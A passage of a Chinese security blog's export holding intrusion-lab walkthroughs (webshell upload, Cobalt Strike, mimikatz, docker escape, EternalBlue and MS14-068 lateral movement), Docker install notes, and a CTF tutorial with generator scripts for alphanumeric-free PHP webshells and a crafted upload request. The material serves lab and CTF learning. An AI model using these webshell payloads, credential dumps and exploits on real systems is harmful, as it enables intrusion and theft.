class="line-numbers language-none"><code class="language-none">netsh advfirewall set allprofiles state off  # windows server 2003 之后<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h3><ol><li><p>通过<a href="https://www.cnblogs.com/yujin2020/p/14310839.html">yxcms 1.2.1漏洞</a>写入一句话木马，得到webshell。</p></li><li><p>上线cs</p><p>监听器<img src="/2022/07/09/hong-ri-ba-chang/image-20220704172003931.png" alt="image-20220704172003931"></p></li></ol><p>​       因为是windows 生成 powershell payload </p><p>​    Attacks-&gt;web Dirven-by-&gt;scripted Web Delivery </p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220704172235700.png" alt="image-20220704172235700"></p><p>​      蚁剑 </p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220704172318493.png" alt="image-20220704172318493"></p><p>然后就能看到上线成功<img src="/2022/07/09/hong-ri-ba-chang/image-20220704172401589.png" alt="image-20220704172401589"></p><p>3.拿到了一台主机，以其为跳板。</p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220704172609735.png" alt="image-20220704172609735"></p><p>执行交互命令前 先sleep 0  不然可能等好久 。。</p><p>收集信息 shell systeminfo</p><p>探测域中其它主机 net view</p><p> 域控 net group “domain controllers” /domain</p><p>域管用户: net group “domain admins”/domain</p><p>域用户 net user /domain</p><ol start="4"><li><p>mimikatz dump出域控密码，然后psexec</p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220704173348763.png" alt="image-20220704173348763"></p></li></ol><p>说明：  Listener 为<img src="/2022/07/09/hong-ri-ba-chang/image-20220704173438833.png" alt="image-20220704173438833"></p><p>   session  即已获得的主机为跳板</p><p>得到</p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220704173553353.png" alt="image-20220704173553353"></p><h2 id="红日靶场2"><a href="#红日靶场2" class="headerlink" title="红日靶场2"></a>红日靶场2</h2><p>WEB   主机要恢复快照到V1.3  。 开启Weblogic服务</p><p><a href="https://www.bilibili.com/video/BV1w54y1G7JE?spm_id_from=333.337.search-card.all.click">视频讲解</a></p><pre class="line-numbers language-none"><code class="language-none">nmap扫描nmap -sV -Pn -T4 192.168.111.80   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://github.com/rabbitmask/WeblogicScan">WeblogicScan</a>工具扫描</p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220706185448556.png" alt="image-20220706185448556"></p><p>然后github找 cve工具 </p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220706185621925.png" alt="image-20220706185621925"></p><p>最终</p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220706185823703.png" alt="image-20220706185823703"></p><p>然后上线cs</p><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220706190127376.png" alt="image-20220706190127376"></p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>kail自带</p><pre class="line-numbers language-none"><code class="language-none">msfconsole  启动<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>渗透步骤：</p><pre class="line-numbers language-none"><code class="language-none">search 某个漏洞use 使用某个漏洞利用模块show options 查看配置选项set payload 配置攻击载荷exploit 执行渗透攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>寄 没保存，不想再写一遍了，反正也是根据视频和wp打的。</p><h2 id="红日靶场4"><a href="#红日靶场4" class="headerlink" title="红日靶场4"></a>红日靶场4</h2><p>环境：ubuntu : 仅主机(192.168.183.128)  nat(192.168.110.128) </p><p>​           DC:          仅主机(192.168.183.130)</p><p>​           win7        仅主机(192.168.183.129)</p><p>开启环境，查看作者拉取过的环境，开启就好。 <code>主要关注 cve-2017-12615_tomcat 能docker逃逸 ：配置不当引起——开启privileged（特权模式）+宿主机目录挂载（文件挂载)</code></p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709161406885.png" alt="image-20220709161406885"></p><p>这个漏洞主要是当web.xml中readonly设置为false时可以通过PUT/DELETE进行文件操控，漏洞就会触发。 同时利用了windows下文件名解析的漏洞来触发</p><p><strong>具体来说，主要有三种方法绕过tomcat检测：</strong></p><pre class="line-numbers language-none"><code class="language-none">shell.jsp%20shell.jsp::$DATAshell.jsp/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709162014733.png" alt="image-20220709162014733"></p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709162623843.png" alt="image-20220709162623843"></p><p>可以看到有磁盘sda 挂载就逃逸出docker 到了宿主机</p><p>所以现在想宿主机的getshell，linux用户通过/etc/passwd 和/etc/shadow 进行验证，所以写入一个用户然后连 (写wp时我就没去写用户了，反正本来就有一个ubuntu用户)<img src="/2022/07/09/hong-ri-ba-chang/image-20220709163530574.png" alt="image-20220709163530574"></p><p>得到shell后，就是扫内网了。</p><p>传到Ubuntu上 fscan工具,在kail上起一个服务</p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709163852813.png" alt="image-20220709163852813"></p><p>然后ubuntu中 </p><pre class="line-numbers language-none"><code class="language-none">wget http://192.168.110.129:8888/fscan_amd64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709164254069.png" alt="image-20220709164254069"></p><p>可以发现存在MS17-010(永恒之蓝)</p><p>因为在内网，我们需要用ubuntu机作为跳板，用代理工具<a href="https://github.com/Dliv3/Venom">Venom v1.1.0</a></p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709164950604.png" alt="image-20220709164950604"></p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709165026918.png" alt="image-20220709165026918"></p><p>这样本地 7777端口就代理能进内网了。payload改为正向</p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709165322293.png" alt="image-20220709165322293"></p><pre class="line-numbers language-none"><code class="language-none">set rhost 192.168.183.129 setg Proxies socks5:127.0.0.1:7777exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到shell. 下一步就想提权了，看补丁，也有对应工具，实际上就是ms14-068漏洞，win7主机它也下好了。</p><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220709175201270.png" alt="image-20220709175201270"></p><pre class="line-numbers language-none"><code class="language-none">cd:\usersdircd dousers\desktopdirms14-068 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 需要参数，  -p 明文密码  -d 域控ip   -s 用户id</p><p>域控IP</p><pre class="line-numbers language-none"><code class="language-none">net view ping 或者 nslookup   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>明文密码</p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; load kiwicreds_all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用户id</p><pre class="line-numbers language-none"><code class="language-none">shellchcp 65001 # utf-8 编码  whoami /all得到的是永恒之蓝打来的system权限 不是域里面的所以我们要把我们的权限弄到域用户里psexitmsf6 &gt; steal_token 域用户进程的idshell  chcp 65001whoami /all <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>崩溃 好不容易ms17打成功了 然后不小心按退出了，可能代理的网不够稳定。</p><p>后面就算ms14 得到伪造管理员权限的TGT。 用mimikatz 导入票据。</p><p>永恒之蓝打了一个小时还是没出。。不准备继续写了。。。离谱。 </p><p>看白日梦组长的视频吧</p>]]></content>
      
      
      <categories>
          
          <category> 红日靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透入门之红日靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>doker学习</title>
      <link href="/2022/04/27/doker-xue-xi/"/>
      <url>/2022/04/27/doker-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="docker概述"><a href="#docker概述" class="headerlink" title="docker概述"></a>docker概述</h2><p> 需求：项目带上环境(镜像) </p><p> 核心思想 ：隔离，打包装箱，每个箱子是隔离的</p><p>Docker 是基于Go语言开发的开源项目</p><p>官网：<a href="https://www.docker.com/get-started/">https://www.docker.com/get-started/</a></p><p>docker文档 <a href="https://docs.docker.com/">https://docs.docker.com/</a></p><p>docker仓库：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p>比较Docker和虚拟机技术的不同</p><ul><li><p>传统虚拟机，虚拟出一条硬件，运行一个完整的操作系统，然后在这个系统上安装和运行软件</p></li><li><p>容器内的应用是直接运行在 宿主机的内核中，容器是没有自己的内核的，也没有虚拟我们的硬件，所以就轻便了</p></li><li><p>每个 容器之间是相互隔离的，每个容器内都有一个属于自己的文件系统，互不影响。</p></li></ul><blockquote><p>DevOps(开发运维)</p></blockquote><p>应用更快速的交付和部署</p><p>传统：一堆帮助文档，安装程序</p><p>Docker：打包镜像发布测试 一键运行</p><p>更快速的升级和扩缩容</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><h3 id="官网加以辅助"><a href="#官网加以辅助" class="headerlink" title="官网加以辅助"></a>官网加以辅助</h3><p><a href="https://docs.docker.com/engine/install/centos/">https://docs.docker.com/engine/install/centos/</a></p><h3 id="CentOs"><a href="#CentOs" class="headerlink" title="CentOs"></a>CentOs</h3><p>CentOs根据官网 主要写了一些不同的或者补充 具体步骤可以根据下面的Ubuntu和官网参考</p><p>默认国外的</p><pre class="line-numbers language-none"><code class="language-none">sudo yum-config-manager \   --add-repo \   https://download.docker.com/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改为阿里云的镜像</p><pre class="line-numbers language-none"><code class="language-none">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新yum软件包索引</p><pre class="line-numbers language-none"><code class="language-none">yum makecache fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动docker</p><pre class="line-numbers language-none"><code class="language-none">systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用docker verison 看是否安装成功</p><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p>1、卸载旧docker的版本</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get remove docker docker-engine docker.io containerd runc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、set up the repository</p><ul><li>1.Update the <code>apt</code> package index and install packages to allow <code>apt</code> to use a repository over HTTPS:</li></ul><pre class="line-numbers language-none"><code class="language-none">sudo apt-get updatesudo apt-get install \    ca-certificates \    curl \    gnupg \    lsb-release<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>2.Add Docker’s official GPG key:</li></ul><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg可以换成阿里云的curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>3.Use the following command to set up the <strong>stable</strong> repository.</li></ul><pre class="line-numbers language-none"><code class="language-none">echo \ "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null  换成阿里云的 echo \ "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \ $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、更新apt包索引</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、Install Docker Engine</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5、Start Docker</p><pre class="line-numbers language-none"><code class="language-none">sudo systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6、使用docker verison 看是否安装成功</p><pre class="line-numbers language-none"><code class="language-none">docker verison<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.配置镜像加速器</p><ul><li>阿里云的 (<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">容器加速服务</a>) </li></ul><p>您可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器</p><pre class="line-numbers language-none"><code class="language-none">$ vim /etc/docker/daemon.json# 加入以下代码{  "registry-mirrors": ["https://sdk2e04a.mirror.aliyuncs.com"]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>(<a href="https://www.daocloud.io/mirror#accelerator-doc">道客</a>) </li></ul><pre class="line-numbers language-none"><code class="language-none">http://f1361db2.m.daocloud.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="kail"><a href="#kail" class="headerlink" title="kail"></a>kail</h3><p>1.更新apt源满足下载要求</p> <pre class="line-numbers language-none"><code class="language-none">cd /etc/apt/sources.list.dvim docker.list(一般没有，创建docker.list)写入下面其中一个的源#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.进行系统或工具的更新</p><pre class="line-numbers language-none"><code class="language-none">#注：当出现正在设定软件包界面时，直接按tab+enter进行确认apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade#礼貌性清除更新缓存apt-get clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.安装docker 和docker-compose</p><pre class="line-numbers language-none"><code class="language-none">apt-get install docker docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.启动docker并检验是否安装成功</p><pre class="line-numbers language-none"><code class="language-none">systemctl start dockerdocker version 出来了就是成功了还有docker-compose verison(不是最新版) 看第6点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.配置阿里云镜像加速</p><pre class="line-numbers language-none"><code class="language-none">#镜像加速器网址写入/etc/docker/daemon.json文件(可能不存在)中vim /etc/docker/daemon.json #新建daemon.jsp文件touch /etc/docker/daemon.json #写入内容{"registry-mirrors": ["https://sdk2e04a.mirror.aliyuncs.com"]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6.docker-compose  </p><p>/usr/bin下面的都是系统预装的可执行程序，会随着系统升级而改变。</p><p>/usr/local/bin目录是给用户放置自己的可执行程序的地方，推荐放在这里，不会被系统升级而覆盖同名文件。 </p><p>其实我别的操作系统的是安装在/usr/local/bin中</p><pre class="line-numbers language-none"><code class="language-none">#首先查看docker-compose在哪1.whereis docker-compose2.改成相应目录下载 (我是直接先卸载了再搞，如果没卸载直接执行我估计应该是覆盖吧 没试。)curl -L https://get.daocloud.io/docker/compose/releases/download/v2.4.1/docker-compose-`uname -s`-`uname -m` &gt; /usr/bin/docker-compose3.赋予执行权限chmod +x /usr/bin/docker-compose4.卸载sudo rm /usr/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="卸载docker"><a href="#卸载docker" class="headerlink" title="卸载docker"></a>卸载docker</h4><pre class="line-numbers language-none"><code class="language-none">sudo apt-get purge docker-ce docker-ce-cli containerd.io docker-compose-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"> sudo rm -rf /var/lib/docker$ sudo rm -rf /var/lib/containerd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><pre class="line-numbers language-none"><code class="language-none">curl -L https://github.com/docker/compose/releases/download/v2.4.1/docker-compose-$(uname -s)-$(uname -m) &gt; /usr/local/bin/docker-compose改成下面的更快curl -L https://get.daocloud.io/docker/compose/releases/download/v2.4.1/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">chmod +x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="卸载-Docker-Compose"><a href="#卸载-Docker-Compose" class="headerlink" title="卸载 Docker Compose"></a>卸载 Docker Compose</h3><pre class="line-numbers language-none"><code class="language-none">sudo rm /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Docker-Swarm"><a href="#Docker-Swarm" class="headerlink" title="Docker Swarm"></a>Docker Swarm</h2>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无数字字母rce</title>
      <link href="/2022/03/21/wu-shu-zi-zi-mu-rce/"/>
      <url>/2022/03/21/wu-shu-zi-zi-mu-rce/</url>
      
        <content type="html"><![CDATA[<p>在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {  eval($_GET['shell']);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此内容结合 P神博客 和羽师傅脚本</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> p神相关博客内容</p><h2 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h2><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php/*author yu22x*/$myfile = fopen("xor_rce.txt", "w");$contents="";for ($i=0; $i &lt; 256; $i++) { for ($j=0; $j &lt;256 ; $j++) { if($i&lt;16){$hex_i='0'.dechex($i);}else{$hex_i=dechex($i);}if($j&lt;16){$hex_j='0'.dechex($j);}else{$hex_j=dechex($j);}$preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){echo "";    }  else{$a='%'.$hex_i; //因为其中存在很多不可打印字符，所以我url编码表示了）：$b='%'.$hex_j;$c=(urldecode($a)^urldecode($b));if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {$contents=$contents.$c." ".$a." ".$b."\n";}}}}fwrite($myfile,$contents);fclose($myfile);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=""   s2=""   for i in arg:       f=open("xor_rce.txt","r")       while True:           t=f.readline()           if t=="":               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output="(\""+s1+"\"^\""+s2+"\")"   return(output)   while True:   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"   print(param)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p><p><img src="/2022/03/21/wu-shu-zi-zi-mu-rce/image-20220321210302352.png" alt="image-20220321210302352"></p><h2 id="二、或"><a href="#二、或" class="headerlink" title="二、或"></a>二、或</h2><p>原理是一样的，只需要在上面的脚本上稍加改动即可</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php/* author yu22x */$myfile = fopen("or_rce.txt", "w");$contents="";for ($i=0; $i &lt; 256; $i++) { for ($j=0; $j &lt;256 ; $j++) { if($i&lt;16){$hex_i='0'.dechex($i);}else{$hex_i=dechex($i);}if($j&lt;16){$hex_j='0'.dechex($j);}else{$hex_j=dechex($j);}$preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){echo "";    }  else{$a='%'.$hex_i;$b='%'.$hex_j;$c=(urldecode($a)|urldecode($b));if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {$contents=$contents.$c." ".$a." ".$b."\n";}}}}fwrite($myfile,$contents);fclose($myfile);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=""   s2=""   for i in arg:       f=open("or_rce.txt","r")       while True:           t=f.readline()           if t=="":               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output="(\""+s1+"\"|\""+s2+"\")"   return(output)   while True:   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"   print(param)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、取反"><a href="#三、取反" class="headerlink" title="三、取反"></a>三、取反</h2><p>因为取反的话，基本上用的都是一个不可见字符，所有不会触发到正则表达式，我们一个php脚本就可以了</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,'[+]your function: ');$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); fwrite(STDOUT,'[+]your command: ');$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>也就是说，<code>'a'++ =&gt; 'b'</code>，<code>'b'++ =&gt; 'c'</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><pre class="line-numbers language-none"><code class="language-none">echo []."";    得到Array   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$_=[];$_=@"$_"; // $_='Arrayspan aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$_=('@'^'!'); //a$__=++$_; //b$___=++$__; //c   $____=++$___; //d$_____=++$____; //e$______=++$_____; //f$_______=++$______; //g$________=++$_______; //h$_________=++$________; //i$__________=++$_________; //j$___________=++$__________; //k$____________=++$___________; //l$_____________=++$____________; //m$______________=++$_____________; //n$_______________=++$______________; //o$________________=++$_______________; //p$_________________=++$________________; //q$__________________=++$_________________; //r$___________________=++$__________________; //s$____________________=++$___________________; //t$_____________________=++$____________________; //u$______________________=++$_____________________; //v$_______________________=++$______________________; //w$________________________=++$_______________________; //x$_________________________=++$________________________; //y$__________________________=++$_________________________; //z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="增加难度"><a href="#增加难度" class="headerlink" title="增加难度"></a>增加难度</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET['code'])){    $code = $_GET['code'];    if(strlen($code)&gt;35){        die("Long.");    }    if(preg_match("/[A-Za-z0-9_$]+/",$code)){        die("NO.");    }    eval($code);}else{    highlight_file(__FILE__);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题多了两个限制：</p><ol><li>webshell长度不超过35位</li><li>除了不包含字母数字，还不能包含<code>$</code>和<code>_</code></li></ol><p>上传临时文件</p><p>具体原理看p神博客<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>例子：ctfshow web 红包题第二弹</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php        if(isset($_GET['cmd'])){            $cmd=$_GET['cmd'];            highlight_file(__FILE__);            if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){                            die("cerror");            }            if(preg_match("/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){                die("serror");            }            eval($cmd);                }         ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一步： post burpsute抓包<br>修改请求头</p><pre class="line-numbers language-none"><code class="language-none">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1...Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888Content-Length: 256  (数字随便填浏览器会自动补对 下面必须空行)-----------------------------10242300956292313528205888Content-Disposition: form-data; name="fileUpload"; filename="1.txt"#! /bin/shcat /flag.txt-----------------------------10242300956292313528205888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220322151538855.png" alt="image-20220322151538855"></p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无数字字母rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>session安全</title>
      <link href="/2022/03/08/session-an-quan/"/>
      <url>/2022/03/08/session-an-quan/</url>
      
